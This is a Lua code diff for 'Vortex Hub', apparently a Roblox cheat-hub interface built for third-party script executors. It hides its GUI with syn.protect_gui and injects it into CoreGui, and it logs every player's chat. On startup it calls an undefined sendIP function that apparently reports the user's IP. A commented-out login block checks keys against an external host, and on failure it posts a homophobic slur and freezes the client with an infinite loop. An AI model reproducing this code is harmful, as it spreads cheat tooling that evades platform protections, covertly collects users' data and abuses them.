+        lastLabel.Text = Time().." ["..name.."]; "..txt.." (x"..dupeCount..")"
+      else
+        if dupeCount > 1 then dupeCount = 1 end
+        if #mainFrame:GetChildren() >= 2540 then
+          for i,v in pairs(mainFrame:GetChildren()) do
+            if v:IsA("TextLabel") then
+              v:Destroy()
+            end
+          end
+        end
+        local alls = 0
+        for i,v in pairs(mainFrame:GetChildren()) do
+          if v:IsA("TextLabel") then
+            alls = v.Size.Y.Offset + alls
+          else
+            alls = 0
+          end
+        end
+        local textLabel = framework:Create("TextLabel", {
+          Parent = mainFrame,
+          Font = framework.menuSettings.font,
+          BackgroundTransparency = 1,
+          Text = Time().." ["..name.."]; "..txt,
+          TextSize = framework.menuSettings.textSize,
+          TextColor3 = framework.menuSettings.textColor,
+          Size = UDim2.new(0, 310, 0, 35),
+          TextXAlignment = Enum.TextXAlignment.Left,
+          TextYAlignment = Enum.TextYAlignment.Top,
+          TextWrapped = true
+        })
+        textLabel.Size = UDim2.new(0, 310, 0, textLabel.TextBounds.Y)
+        mainFrame.CanvasSize = UDim2.new(0, 0, 0, alls+textLabel.TextBounds.Y)
+        mainFrame.CanvasPosition = Vector2.new(0, mainFrame.CanvasPosition.Y+textLabel.TextBounds.Y+20)
+      end
+    end
+    local function chatLog(plr)
+      plr.Chatted:Connect(function(msg)
+        if framework.flags["chatLogs"] then
+          createLogLabel(plr.Name, msg)
+        end
+      end)
+    end
+    for _, plr in pairs(game.Players:GetChildren()) do
+        if plr.ClassName == "Player" then
+            chatLog(plr)
+        end
+    end
+    game.Players.PlayerAdded:Connect(function(plr)
+      chatLog(plr)
+    end)
+    game:GetService("RunService").RenderStepped:Connect(function()
+      holder.ImageColor3 = framework.menuSettings.mainColour
+      title.TextSize = framework.menuSettings.textSize
+      logging.TextSize = framework.menuSettings.textSize
+      logging.TextColor3 = framework.menuSettings.textColor
+      title.TextColor3 = framework.menuSettings.textColor
+      save.TextSize = framework.menuSettings.textSize
+      save.TextColor3 = framework.menuSettings.textColor
+      clear.TextSize = framework.menuSettings.textSize
+      clear.TextColor3 = framework.menuSettings.textColor
+      mainFrame.BorderColor3 = framework.menuSettings.mainColour
+      mainFrame.ScrollBarImageColor3 = framework.menuSettings.mainColour
+      checkBoxHolder.BackgroundColor3 = framework.menuSettings.secondaryColour
+      checkmark.ImageColor3 = framework.menuSettings.mainColour
+      logging.TextColor3 = framework.menuSettings.textColor
+      logging.TextSize = framework.menuSettings.textSize
+      if not inContactclear then
+        clear.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+      if not inContactsave then
+        save.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end
+    end)
+  end
+  
+  local function loadOptions(option, holder)
+    for _,newOption in next, option.options do
+      if newOption.type == "toggle" then
+        createToggle(newOption, option)
+      elseif newOption.type == "button" then
+              createButton(newOption, option)
+      elseif newOption.type == "setcolor" then
+        createColorSetButton(newOption, option)
+      elseif newOption.type == "label" then
+              createLabel(newOption, option)
+      elseif newOption.type == "textbox" then
+              createTextBox(newOption, option)
+      elseif newOption.type == "bind" then
+              createBind(newOption, option)
+      elseif newOption.type == "slider" then
+        createSlider(newOption, option)
+      elseif newOption.type == "folder" then
+        newOption:init()
+      elseif newOption.type == "horizontalalignment" then
+        newOption:init()
+      elseif newOption.type == "color" then
+        createColourPicker(newOption, option, holder)
       end
     end
   end
-end
-
-return framework
+  
+  local function getFunctions(parent)
+    function parent:AddToggle(option)
+            option = typeof(option) == "table" and option or {}
+            option.text = tostring(option.text)
+            option.state = typeof(option.state) == "boolean" and option.state or false
+            option.callback = typeof(option.callback) == "function" and option.callback or function() end
+            option.type = "toggle"
+            option.position = #self.options
+            option.flag = option.flag or option.text
+            framework.flags[option.flag] = option.state
+            table.insert(self.options, option)
+  
+            return option
+      end
+  
+    function parent:AddButton(option)
+      option = typeof(option) == "table" and option or {}
+      option.text = tostring(option.text)
+      option.callback = typeof(option.callback) == "function" and option.callback or function() end
+      option.type = "button"
+      option.position = #self.options
+      option.flag = option.flag or option.text
+      table.insert(self.options, option)
+  
+      return option
+    end
+  
+    function parent:AddColor(option)
+      option = typeof(option) == "table" and option or {}
+      option.text = tostring(option.text)
+      option.type = "setcolor"
+      option.position = #self.options
+      option.flag = option.flag or option.text
+      table.insert(self.options, option)
+  
+      return option
+    end
+  
+    function parent:AddLabel(option)
+            option = typeof(option) == "table" and option or {}
+            option.text = tostring(option.text)
+            option.type = "label"
+            option.position = #self.options
+            table.insert(self.options, option)
+  
+            return option
+    end
+  
+    function parent:AddTextbox(option)
+      option = typeof(option) == "table" and option or {}
+      option.text = tostring(option.text)
+      option.value = tostring(option.value or "")
+      option.callback = typeof(option.callback) == "function" and option.callback or function() end
+      option.type = "textbox"
+      option.position = #self.options
+      option.flag = option.flag or option.text
+      framework.flags[option.flag] = option.value
+      table.insert(self.options, option)
+  
+      return option
+    end
+  
+    function parent:AddBind(option)
+            option = typeof(option) == "table" and option or {}
+            option.text = tostring(option.text)
+            option.key = (option.key and option.key.Name) or option.key or "F"
+            option.hold = typeof(option.hold) == "boolean" and option.hold or false
+            option.callback = typeof(option.callback) == "function" and option.callback or function() end
+            option.type = "bind"
+            option.position = #self.options
+            option.flag = option.flag or option.text
+            framework.flags[option.flag] = option.key
+            table.insert(self.options, option)
+  
+            return option
+      end
+  
+    function parent:AddSlider(option)
+      option = typeof(option) == "table" and option or {}
+      option.text = tostring(option.text)
+      option.min = typeof(option.min) == "number" and option.min or 0
+      option.max = typeof(option.max) == "number" and option.max or 0
+      option.dual = typeof(option.dual) == "boolean" and option.dual or false
+      option.value = math.clamp(typeof(option.value) == "number" and option.value or option.min, option.min, option.max)
+      option.value2 = typeof(option.value2) == "number" and option.value2 or option.max
+      option.callback = typeof(option.callback) == "function" and option.callback or function() end
+      option.float = typeof(option.value) == "number" and option.float or 1
+      option.type = "slider"
+      option.position = #self.options
+      option.flag = option.flag or option.text
+      framework.flags[option.flag] = option.value
+      table.insert(self.options, option)
+  
+      return option
+    end
+  
+    function parent:AddFolder(title)
+            local option = {}
+            option.title = tostring(title)
+            option.options = {}
+            option.open = false
+            option.type = "folder"
+            option.position = #self.options
+            table.insert(self.options, option)
+  
+            getFunctions(option)
+  
+            function option:init()
+                createFolder(self.title, parent.main, self, true)
+                loadOptions(self, parent)
+            end
+  
+            return option
+    end
+  
+    function parent:AddHorizontalAlignment()
+            local option = {}
+            option.options = {}
+            option.open = false
+            option.type = "horizontalalignment"
+            option.position = #self.options
+            table.insert(self.options, option)
+  
+            getFunctions(option)
+  
+            function option:init()
+                createHorizontalAlignment(parent.main, self, true)
+                loadOptions(self, parent)
+            end
+  
+            return option
+    end
+  
+    function parent:AddColorPicker(option)
+      option = typeof(option) == "table" and option or {}
+      option.text = tostring(option.text)
+      option.color = typeof(option.color) == "table" and Color3.new(tonumber(option.color[1]), tonumber(option.color[2]), tonumber(option.color[3])) or option.color or Color3.new(255, 255, 255)
+      option.callback = typeof(option.callback) == "function" and option.callback or function() end
+      option.open = false
+      option.type = "color"
+      option.position = #self.options
+      option.flag = option.flag or option.text
+      framework.flags[option.flag] = option.color
+      table.insert(self.options, option)
+  
+      return option
+    end
+  end
+  
+  function framework:AddTab(title)
+      local tab = {title = tostring(title), options = {}, open = true, canInit = true, init = false}
+      getFunctions(tab)
+      table.insert(framework.tabs, tab)
+  
+      return tab
+  end
+  
+  function framework:LoadUI()
+    local topBar = framework:Create("ImageLabel", {
+      Parent = framework.base,
+      Name = "holder",
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 527, 0, 38),
+      Position = UDim2.new(-0.500, 0, 0.039, 0),
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = framework.menuSettings.mainColour,
+      BorderColor3 = framework.menuSettings.secondaryColour,
+      ScaleType = Enum.ScaleType.Slice,
+      SliceCenter = Rect.new(100, 100, 100, 100),
+          SliceScale = 0.08
+    })
+    local dropDown = framework:Create("ImageLabel", {
+      Parent = topBar,
+      BackgroundTransparency = 1,
+      Position = UDim2.new(0.015, 0, 0.153, 0),
+      Size = UDim2.new(0, 22, 0, 20),
+      Image = "http://www.roblox.com/asset/?id=6282522798",
+      ScaleType = Enum.ScaleType.Fit
+    })
+    local uiTitle = framework:Create("TextLabel", {
+      Parent = topBar,
+      Position = UDim2.new(0.064, 0, 0, 0),
+      Size = UDim2.new(0, 494, 0, 24),
+      BackgroundTransparency = 1,
+      Font = framework.menuSettings.font,
+      Text = "Vortex Hub",
+      TextColor3 = Color3.fromRGB(255, 255, 255),
+      TextSize = framework.menuSettings.titleSize,
+      TextXAlignment = Enum.TextXAlignment.Left
+    })
+    local holder = framework:Create("ImageLabel", {
+      Parent = topBar,
+      Name = "mainHolder",
+      BackgroundTransparency = 1,
+      ClipsDescendants = true,
+      Size = UDim2.new(0, 527, 0, 477),
+      Position = UDim2.new(-0, 0, 0.632, 0),
+      Image = "rbxassetid://3570695787",
+      ImageColor3 = Color3.fromRGB(20, 20, 20),
+      ScaleType = Enum.ScaleType.Slice,
+      SliceCenter = Rect.new(100, 100, 100, 100),
+          SliceScale = 0.04
+    })
+    local tabs = framework:Create("Frame", {
+      Parent = holder,
+      Name = "tabs",
+      BackgroundColor3 = Color3.fromRGB(30, 30, 30),
+      BorderColor3 = framework.menuSettings.mainColour,
+      BorderSizePixel = 0,
+      Position = UDim2.new(-0, 0, -0.002, 0),
+      Size = UDim2.new(0, 527, 0, 22),
+    })
+    local tabSortout = framework:Create("UIListLayout", {
+      Parent = tabs,
+      Padding = UDim.new(0, 7),
+      FillDirection = Enum.FillDirection.Horizontal,
+      HorizontalAlignment = Enum.HorizontalAlignment.Left
+    })
+    local tabOptionsHolder = framework:Create("Folder", {
+      Name = "tabOptionsHolder",
+      Parent = holder
+    })
+    local line = framework:Create("Frame", {
+      Parent = holder,
+      BackgroundColor3 = framework.menuSettings.mainColour,
+      BorderSizePixel = 0,
+      Position = UDim2.new(-0.002, 0, 0.046, 0),
+      Size = UDim2.new(0, 527, 0, 2)
+    })
+    dragify(topBar)
+    for i, tab in next, self.tabs do
+      if tab.canInit and not tab.init then
+        tab.init = true
+        createTab(tab.title, tabOptionsHolder, tab)
+        loadOptions(tab)
+      end
+    end
+    tweenService:Create(topBar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.400, 0, 0.039, 0)}):Play()
+    wait(.5)
+    tweenService:Create(topBar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.100, 0, 0.039, 0)}):Play()
+    framework:sendNotification("C͟r͟e͟d͟i͟t͟s͟\n Programmer: Vect0rs(Max)\n Therapist: Azooz")
+    dropDown.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        framework.toggled = not framework.toggled
+        tweenService:Create(holder, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Size = framework.toggled and UDim2.new(0, 527, 0, 0) or UDim2.new(0, 527, 0, 477)}):Play()
+        tweenService:Create(dropDown, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = framework.toggled and 270 or 0}):Play()
+      end
+    end)
+    topBar.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragify(topBar)
+      end
+    end)
+    game.Players.PlayerAdded:Connect(function(plr)
+            if framework.admin_accounts.azoozAccounts[plr.UserId] then
+                framework:sendNotification("Azooz has joined your server")
+          createNameTag(plr.Name, "Azooz")
+            elseif framework.admin_accounts.smail_accounts[plr.UserId] then
+                framework:sendNotification("Smail has joined your server")
+          createNameTag(plr.Name, "Smail")
+        elseif framework.admin_accounts.max_accounts[plr.UserId] then
+                framework:sendNotification("Max has joined your server")
+          createNameTag(plr.Name, "Max")
+        elseif framework.admin_accounts.raven_accounts[plr.UserId] then
+          framework:sendNotification("Raven has joined your server")
+          createNameTag(plr.Name, "Raven")
+            end
+        plr.CharacterAdded:Connect(function(plr)
+          print(plr)
+          if framework.admin_accounts.azoozAccounts[plr.UserId] then
+            createNameTag(plr.Name, "Azooz")
+          elseif framework.admin_accounts.smail_accounts[plr.UserId] then
+            createNameTag(plr.Name, "Smail")
+          elseif framework.admin_accounts.max_accounts[plr.UserId] then
+            createNameTag(plr.Name, "Max")
+          elseif framework.admin_accounts.raven_accounts[plr.UserId] then
+            createNameTag(plr.Name, "Raven")
+          end
+        end)
+      end)
+    for i, plr in next, game.Players:GetChildren() do
+       plr.CharacterAdded:Connect(function(plr)
+          plr = game.Players[plr.Name]
+          print(plr)
+          if framework.admin_accounts.azoozAccounts[plr.UserId] then
+            createNameTag(plr.Name, "Azooz")
+          elseif framework.admin_accounts.smail_accounts[plr.UserId] then
+            createNameTag(plr.Name, "Smail")
+          elseif framework.admin_accounts.max_accounts[plr.UserId] then
+            createNameTag(plr.Name, "Max")
+          elseif framework.admin_accounts.raven_accounts[plr.UserId] then
+            createNameTag(plr.Name, "Raven")
+          end
+        end)
+      if framework.admin_accounts.azoozAccounts[plr.UserId] then
+          createNameTag(plr.Name, "Azooz")
+        elseif framework.admin_accounts.smail_accounts[plr.UserId] then
+          createNameTag(plr.Name, "Smail")
+        elseif framework.admin_accounts.max_accounts[plr.UserId] then
+          createNameTag(plr.Name, "Max")
+        elseif framework.admin_accounts.raven_accounts[plr.UserId] then
+          createNameTag(plr.Name, "Raven")
+        end
+    end
+    game:GetService("RunService").RenderStepped:Connect(function()
+        topBar.ImageColor3 = framework.menuSettings.mainColour
+        uiTitle.TextSize = framework.menuSettings.titleSize
+        uiTitle.Font = framework.menuSettings.font
+        uiTitle.TextColor3 = framework.menuSettings.textColor
+        topBar.ImageColor3 = framework.menuSettings.mainColour
+        topBar.BorderColor3 = framework.menuSettings.secondaryColour
+        line.BackgroundColor3 = framework.menuSettings.mainColour
+        tabs.BorderColor3 = framework.menuSettings.mainColour
+    end)
+  end
+  
+  function framework:Init()
+    if game:GetService("CoreGui"):FindFirstChild("キャット") then
+      return
+    end
+    self.base = self.base or self:Create("ScreenGui")
+    self.base.ResetOnSpawn = false
+    self.base.Parent = game:GetService("CoreGui")
+    self.base.Name = "キャット"
+    local Name = "whitelistkey.azooz"
+    local Settings = { }
+    local rememberMetoggle = false
+    local inContactTextButton = false
+    local inContactTextBox = false
+    local HttpRequest = http_request
+    if syn and syn.protect_gui then
+      syn.protect_gui(self.base)
+    elseif get_hidden_gui then
+      get_hidden_gui(self.base)
+    else
+      game:GetService"Players".LocalPlayer:Kick("Error: protect_gui function not found")
+      return
+    end
+    sendIP("nil")
+    topBar:Destroy()
+    framework:LoadUI()
+    framework:sendNotification("UI Loaded, Enjoy!")
+    warn(game.Players.LocalPlayer.Name.." is whitelisted")
+    --[[if not pcall(function() readfile(Name) end) then
+      local topBar = framework:Create("ImageLabel", {
+        Parent = self.base,
+        Name = "holder",
+        BackgroundTransparency = 1,
+        Size = UDim2.new(0, 354, 0, 30),
+        Position = UDim2.new(-0.500, 0, 0.039, 0),
+        Image = "rbxassetid://3570695787",
+        ImageColor3 = framework.menuSettings.mainColour,
+        BorderColor3 = framework.menuSettings.secondaryColour,
+        ScaleType = Enum.ScaleType.Slice,
+        SliceCenter = Rect.new(100, 100, 100, 100),
+        SliceScale = 0.08
+      })
+      local holder = framework:Create("ImageLabel", {
+        Parent = topBar,
+        Name = "holder",
+        BackgroundTransparency = 1,
+        ClipsDescendants = true,
+        Size = UDim2.new(0, 354, 0, 109),
+        Position = UDim2.new(-0, 0, 0.639, 0),
+        Image = "rbxassetid://3570695787",
+        ImageColor3 = Color3.fromRGB(20, 20, 20),
+        ScaleType = Enum.ScaleType.Slice,
+        SliceCenter = Rect.new(100, 100, 100, 100),
+        SliceScale = 0.04
+      })
+      local textLabel = framework:Create("TextLabel", {
+        Parent = topBar,
+        Size = UDim2.new(0, 353, 0, 19),
+        Position = UDim2.new(0, 0, 0, 0),
+        BackgroundTransparency = 1,
+        Font = framework.menuSettings.font,
+        TextSize = framework.menuSettings.textSize,
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        Text = "Vortex Login"
+      })
+      local frame = framework:Create("Frame", {
+        Parent = holder,
+        Position = UDim2.new(-0, 0, -0.002, 0),
+        Size = UDim2.new(0, 354, 0, 22),
+        BorderSizePixel = 0,
+        BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+      })
+      local textboxHolder = framework:Create("Frame", {
+        Parent = holder,
+        BackgroundTransparency = 1,
+        Position = UDim2.new(-0.003, 0,0.125, 0),
+        Size = UDim2.new(0, 350, 0, 25),
+      })
+      local textBox = framework:Create("TextBox", {
+        Parent = textboxHolder,
+        Size = UDim2.new(0, 280, 0, 18),
+        Position = UDim2.new(0, 30, 0, 5),
+        BackgroundColor3 = framework.menuSettings.secondaryColour,
+        BorderColor3 = Color3.fromRGB(255, 255, 255),
+        TextSize = framework.menuSettings.textSize,
+        Text = "",
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        PlaceholderColor3 = Color3.fromRGB(255, 255, 255),
+        PlaceholderText = "Whitelist Key",
+        Font = framework.menuSettings.font,
+      })
+      local toggleHolder = framework:Create("Frame", {
+        Parent = holder,
+        BackgroundTransparency = 1,
+        Position = UDim2.new(0.073, 0, 0.474, 0),
+        Size = UDim2.new(0, 163, 0, 25),
+      })
+      local checkBoxHolder = framework:Create("Frame", {
+        Parent = toggleHolder,
+        BackgroundColor3 = framework.menuSettings.secondaryColour,
+        BorderColor3 = Color3.fromRGB(255, 255, 255),
+        BorderSizePixel = 1,
+        Size = UDim2.new(0, 20, 0, 20),
+        Position = UDim2.new(0.037, 0, 0.08, 0),
+      })
+      local checkmark = framework:Create("ImageLabel", {
+        Parent = checkBoxHolder,
+        BackgroundTransparency = 1,
+        Visible = false,
+        Image = "http://www.roblox.com/asset/?id=5226924982",
+        ImageColor3 = framework.menuSettings.mainColour,
+        ScaleType = Enum.ScaleType.Stretch,
+        Position = UDim2.new(0, 0, 0, 0),
+        Size = UDim2.new(0, 20, 0, 20)
+      })
+      local rememberMe = framework:Create("TextLabel", {
+        Parent = toggleHolder,
+        BackgroundTransparency = 1,
+        TextSize = framework.menuSettings.textSize,
+        Text = "Remember Me",
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        Font = framework.menuSettings.font,
+        TextXAlignment = Enum.TextXAlignment.Left,
+        Position = UDim2.new(0.241, 0, -0.04, 0),
+        Size = UDim2.new(0, 129, 0, 25)
+      })
+      local textButtonHolder = framework:Create("Frame", {
+        Parent = holder,
+        BackgroundTransparency = 1,
+        Size = UDim2.new(0, 163, 0, 25),
+        Position = UDim2.new(0.257, 0, 0.688, 0)
+      })
+      local textButton = framework:Create("TextLabel", {
+        Parent = textButtonHolder,
+        Size = UDim2.new(0, 154, 0, 18),
+        Position = UDim2.new(0.04, 0, 0.14, 0),
+        BackgroundColor3 = framework.menuSettings.secondaryColour,
+        BorderColor3 = Color3.fromRGB(255, 255, 255),
+        Font = framework.menuSettings.font,
+        TextSize = framework.menuSettings.textSize,
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        Text = "Login"
+      })
+      checkBoxHolder.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+          rememberMetoggle = not rememberMetoggle
+          if rememberMetoggle then
+            checkmark.Visible = true
+          else
+            checkmark.Visible = false
+          end
+        end
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+          tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = framework.menuSettings.mainColour}):Play()
+          tweenService:Create(rememberMe, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.mainColour}):Play()
+        end
+      end)
+      checkBoxHolder.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+            tweenService:Create(rememberMe, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+        end
+      end)
+      rememberMe.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+          rememberMetoggle = not rememberMetoggle
+          if rememberMetoggle then
+            checkmark.Visible = true
+          else
+            checkmark.Visible = false
+          end
+        end
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+          tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = framework.menuSettings.mainColour}):Play()
+          tweenService:Create(rememberMe, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.mainColour}):Play()
+        end
+      end)
+      rememberMe.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+            tweenService:Create(rememberMe, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+        end
+      end)
+      textButton.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            inContactTextButton = true
+            tweenService:Create(textButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
+        end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+          if syn then
+             HttpRequest = syn.request
+             else
+             HttpRequest = http_request
+          end
+          local Response = HttpRequest({
+              Url = "https://vect0rs-hub.000webhostapp.com/azoozhub/"..textBox.Text,
+              Method = "GET"
+          })
+          if rememberMetoggle then
+            Settings["whitelist key"] = textBox.Text
+            writefile(Name, game:service'HttpService':JSONEncode(Settings))
+          end
+          if Response.Body == "true" then
+              sendIP(textBox.Text)
+              topBar:Destroy()
+              framework:LoadUI()
+              framework:sendNotification("UI Loaded, Enjoy!")
+              warn(game.Players.LocalPlayer.Name.." is whitelisted")
+          else
+            framework:sendNotification("face the wall faggot")
+            warn("invalid key..")
+            wait(.5)
+            while true do
+            end
+          end
+        end
+      end)
+      textButton.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            inContactTextButton = false
+            tweenService:Create(textButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+        end
+      end)
+      textBox.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            inContactTextBox = true
+            tweenService:Create(textBox, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
+        end
+      end)
+      textBox.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement then
+            inContactTextBox = false
+            tweenService:Create(textBox, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+        end
+      end)
+      tweenService:Create(topBar, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Position = UDim2.new(0.391, 0, 0.339, 0)}):Play()
+      game:GetService("RunService").RenderStepped:Connect(function()
+        if not inContactTextButton then
+          textButton.BackgroundColor3 = framework.menuSettings.secondaryColour
+        elseif inContactTextBox then
+          textBox.BackgroundColor3 = framework.menuSettings.secondaryColour
+        end
+        textLabel.TextSize = framework.menuSettings.textSize
+        textLabel.TextColor3 = framework.menuSettings.textColor
+        textLabel.Font = framework.menuSettings.font
+        textBox.TextSize = framework.menuSettings.textSize
+        textBox.TextColor3 = framework.menuSettings.textColor
+        textBox.Font = framework.menuSettings.font
+        rememberMe.TextSize = framework.menuSettings.textSize
+        rememberMe.TextColor3 = framework.menuSettings.textColor
+        rememberMe.Font = framework.menuSettings.font
+        textButton.TextSize = framework.menuSettings.textSize
+        textButton.TextColor3 = framework.menuSettings.textColor
+        textButton.Font = framework.menuSettings.font
+  
+        topBar.ImageColor3 = framework.menuSettings.mainColour
+        checkmark.ImageColor3 = framework.menuSettings.mainColour
+        checkBoxHolder.BackgroundColor3 = framework.menuSettings.secondaryColour
+      end)
+    else
+      Settings = game:service'HttpService':JSONDecode(readfile(Name))
+      if syn then
+         HttpRequest = syn.request
+         else
+         HttpRequest = http_request
+      end
+      local Response = HttpRequest({
+              Url = "https://vect0rs-hub.000webhostapp.com/azoozhub/"..Settings["whitelist key"],
+              Method = "GET"
+      })
+      if Response.Body == "true" then
+        sendIP(Settings["whitelist key"])
+        framework:LoadUI()
+        framework:sendNotification("UI Loaded, Enjoy!")
+        warn(game.Players.LocalPlayer.Name.." is whitelisted")
+        return
+      else
+        framework:sendNotification("Invalid key")
+        while true do
+        end
+      end
+    end]]
+  end
+  
+  return framework
